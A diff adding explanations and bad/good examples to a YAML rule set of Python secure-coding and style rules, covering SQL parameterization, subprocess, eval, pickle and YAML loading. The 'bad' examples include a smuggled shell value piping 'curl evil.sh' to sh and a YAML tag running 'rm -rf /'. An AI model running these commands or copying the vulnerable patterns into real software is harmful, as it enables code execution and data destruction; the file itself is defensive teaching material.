@@ -11,6 +11,19 @@ rules:
       `mypy --strict` must pass with no `Any` leaking out of a boundary. An
       unannotated function is invisible to the type checker and to the next
       reader.
+    help: >-
+      Under `--strict`, mypy skips unannotated functions entirely rather than inferring
+      them, so one missing signature silently removes that function and everything it
+      returns from checking. Annotations are also the fastest documentation a reader
+      gets: the signature answers what goes in and what comes out without opening the
+      body.
+    example:
+      bad: |
+        def apply_discount(order, pct):
+            return order.total * (1 - pct)   # not checked at all under --strict
+      good: |
+        def apply_discount(order: Order, pct: Decimal) -> Decimal:
+            return order.total * (1 - pct)
 
   - id: validate-at-the-boundary
     group: must
@@ -21,6 +34,19 @@ rules:
       runtime validator has parsed it. A type annotation on a decoded JSON body
       is documentation, not a check.
     source: OWASP C3
+    help: >-
+      An annotation on a decoded JSON body is a claim, not a check: `json.loads` returns
+      whatever was in the bytes and the annotation does not inspect it. A runtime
+      validator is what turns the claim into a fact, and doing it once at the edge means
+      nothing inward has to re-check. Missing that step moves the failure to an
+      AttributeError somewhere unrelated.
+    example:
+      bad: |
+        body: CreateOrder = json.loads(raw)   # nothing was validated
+        create(body)
+      good: |
+        body = CreateOrder.model_validate_json(raw)   # raises here, at the edge
+        create(body)
 
   - id: parameterize-queries
     group: must
@@ -31,6 +57,18 @@ rules:
       Use bound parameters or the ORM's expression API. An f-string in SQL is an
       injection, whatever the value looks like today.
     source: OWASP C3
+    help: >-
+      Bound parameters keep a value a value, so no input can be reparsed as SQL no
+      matter what characters it contains. An f-string looks identical whether it
+      interpolates a constant or a request field, which is what makes the mistake easy
+      to miss in review. The habit only protects you with no exceptions, so it holds in
+      migrations and scripts too.
+    example:
+      bad: |
+        cur.execute(f"DELETE FROM sessions WHERE user_id = {user_id}")
+      good: |
+        cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
+        # or session.execute(delete(Session).where(Session.user_id == user_id))
 
   - id: subprocess-takes-a-list
     group: must
@@ -40,6 +78,17 @@ rules:
       `subprocess.run(["git", "log", ref])` passes the value as one argument. The
       string form invites the shell to reinterpret it.
     source: OWASP C4
+    help: >-
+      The list form execs the program directly with each element as one argument, so no
+      shell ever sees the string and a value containing a space, a semicolon or a quote
+      stays a single argument. The string form asks a shell to split and interpret it,
+      which is where injection and surprising word-splitting both come from.
+    example:
+      bad: |
+        subprocess.run(f"git log {ref}", shell=True)
+        # ref = "main; curl evil.sh | sh"
+      good: |
+        subprocess.run(["git", "log", ref], check=True)
 
   - id: close-what-you-open
     group: must
@@ -48,6 +97,20 @@ rules:
     body: >-
       Files, sockets, cursors and locks are released by a context manager, not by
       the garbage collector. Exhaustion under load is the failure mode.
+    help: >-
+      CPython's refcounting often closes things promptly, which is exactly why this bug
+      survives testing and then appears in production under load or on another
+      implementation. A `with` block releases the resource deterministically and on the
+      exception path too, which is the path that actually leaks. The failure mode is
+      running out of descriptors or pool connections.
+    example:
+      bad: |
+        f = open(path)
+        data = f.read()      # never closed if read() raises
+        f.close()
+      good: |
+        with open(path) as f:
+            data = f.read()
 
   - id: pin-and-audit-dependencies
     group: must
@@ -58,6 +121,18 @@ rules:
       gate turns a published advisory into a failing build rather than an
       incident.
     source: OWASP C2
+    help: >-
+      A committed lock file makes "it works on my machine" reproducible: everyone, and
+      CI, resolves to the same versions, so a failure is about your code rather than
+      about who installed when. Pairing it with an audit in the gate turns a newly
+      published advisory into a red build, which is the only mechanism that reliably
+      gets it noticed.
+    example:
+      bad: |
+        # uv.lock in .gitignore; pip-audit run manually, occasionally
+      good: |
+        # uv.lock committed
+        # gate runs: uv sync --frozen && pip-audit
 
   - id: no-mutable-default-arguments
     group: must_not
@@ -67,6 +142,23 @@ rules:
     body: >-
       `def f(items=[])` creates one list shared by every call, for the life of the
       process. Default to `None` and build the value inside.
+    help: >-
+      Default arguments are evaluated once, when the function is defined, so the same
+      list or dict is reused by every call for the life of the process. The result is
+      state leaking between unrelated calls: the second caller sees what the first
+      appended. Default to None and build the value inside the body.
+    example:
+      bad: |
+        def add(item: str, items: list[str] = []) -> list[str]:
+            items.append(item)
+            return items
+
+        add("a")   # ['a']
+        add("b")   # ['a', 'b']  - the same list
+      good: |
+        def add(item: str, items: list[str] | None = None) -> list[str]:
+            items = [] if items is None else items
+            return [*items, item]
 
   - id: no-bare-except
     group: must_not
@@ -76,6 +168,23 @@ rules:
       `except:` also catches `KeyboardInterrupt` and `SystemExit`, and
       `except Exception` hides the bug you needed to see. Catch what you can
       actually handle.
+    help: >-
+      A bare `except:` catches BaseException, which includes KeyboardInterrupt and
+      SystemExit, so it makes the process ignore Ctrl-C and interferes with shutdown.
+      `except Exception` is narrower but still catches the programming errors you needed
+      to see, turning a clear traceback into silent wrong behaviour. Catch what you can
+      actually respond to.
+    example:
+      bad: |
+        try:
+            process(batch)
+        except:            # also swallows Ctrl-C
+            log.warning("failed")
+      good: |
+        try:
+            process(batch)
+        except (BatchFormatError, OSError) as err:
+            raise BatchRejected(batch.id) from err
 
   - id: no-eval-or-exec
     group: must_not
@@ -87,6 +196,20 @@ rules:
       not construct. There is always another way, and this one is remote code
       execution.
     source: OWASP C4
+    help: >-
+      `eval`, `exec` and a shell string all compile text into code at runtime, so any
+      attacker-influenced part of that text runs with your process's privileges. There
+      is no safe way to sanitise your way to security here, because the parser is the
+      attack surface. Whatever the goal is, a lookup table, `ast.literal_eval` or a real
+      parser does it without executing anything.
+    example:
+      bad: |
+        op = eval(user_expression)
+        subprocess.run(cmd_from_user, shell=True)
+      good: |
+        ops = {"add": operator.add, "sub": operator.sub}
+        op = ops[name]
+        value = ast.literal_eval(literal)   # data only, never code
 
   - id: no-untrusted-pickle
     group: must_not
@@ -97,6 +220,17 @@ rules:
       Unpickling executes whatever the payload asks for. Use JSON, or a schema
       format, for anything crossing a process or a network boundary.
     source: OWASP C5
+    help: >-
+      Unpickling is not deserialisation, it is execution: the format includes opcodes
+      that import modules and call them, so a crafted payload runs arbitrary code before
+      you ever inspect the result. No amount of validation afterwards helps, because the
+      damage is done during the load. Use JSON or a schema format for anything crossing
+      a process or network boundary.
+    example:
+      bad: |
+        data = pickle.loads(request.body)   # arbitrary code execution
+      good: |
+        data = Payload.model_validate_json(request.body)
 
   - id: no-unsafe-yaml-load
     group: must_not
@@ -106,6 +240,18 @@ rules:
       `yaml.load` without a safe loader can construct arbitrary Python objects.
       `yaml.safe_load` is the same call without the remote code execution.
     source: OWASP C5
+    help: >-
+      `yaml.load` with the default loader can construct arbitrary Python objects via
+      tags like `!!python/object/apply`, which makes parsing a config file equivalent to
+      running it. `safe_load` is the identical call restricted to plain data types, so
+      it costs nothing and removes the entire class of problem.
+    example:
+      bad: |
+        config = yaml.load(open(path))
+        # !!python/object/apply:os.system ['rm -rf /']
+      good: |
+        with open(path) as f:
+            config = yaml.safe_load(f)
 
   - id: no-assert-for-checks
     group: must_not
@@ -114,6 +260,18 @@ rules:
     body: >-
       `python -O` removes every `assert`. Use it for a programmer invariant in a
       test; raise a real exception for anything a user or a caller can trigger.
+    help: >-
+      `python -O` strips every assert from the bytecode, so a check written as an assert
+      is a check that does not exist in an optimised deployment. That is fine for an
+      invariant you are asserting about your own code in a test, and unacceptable for
+      anything a user or a caller can trigger, which is exactly where it disappears when
+      you need it most.
+    example:
+      bad: |
+        assert user.is_admin, "forbidden"   # gone under python -O
+      good: |
+        if not user.is_admin:
+            raise Forbidden("admin required")
 
   - id: no-import-time-side-effects
     group: must_not
@@ -122,6 +280,25 @@ rules:
     body: >-
       An import must not open a connection, read the environment or spawn a
       thread. Do that in an explicit function the composition root calls.
+    help: >-
+      Module bodies run on import, before your configuration is loaded and during any
+      test that transitively imports the file. A connection opened there is opened in
+      every test run and in every tool that merely inspects the module, and a failure at
+      that point produces an ImportError that hides the real cause. Export an init
+      function the composition root calls.
+    example:
+      bad: |
+        # db.py
+        engine = create_engine(os.environ["DATABASE_URL"])
+        # connects on import, before dotenv, in every test
+      good: |
+        # db.py
+        _engine: Engine | None = None
+
+        def init_db(url: str) -> Engine:
+            global _engine
+            _engine = create_engine(url)
+            return _engine
 
   - id: no-star-imports
     group: must_not
@@ -130,3 +307,16 @@ rules:
     body: >-
       `from x import *` makes the origin of a name unknowable and lets a new
       export in `x` silently shadow a local one.
+    help: >-
+      A wildcard import makes it impossible to tell where a name came from without
+      searching every starred module, and it silently shadows: a new export upstream can
+      replace a local name of the same spelling, changing behaviour with no change in
+      your file. It also defeats linters trying to find undefined names.
+    example:
+      bad: |
+        from myapp.models import *
+        from myapp.schemas import *
+        user = User(...)   # which User? whichever imported last
+      good: |
+        from myapp.models import User
+        from myapp.schemas import UserResponse
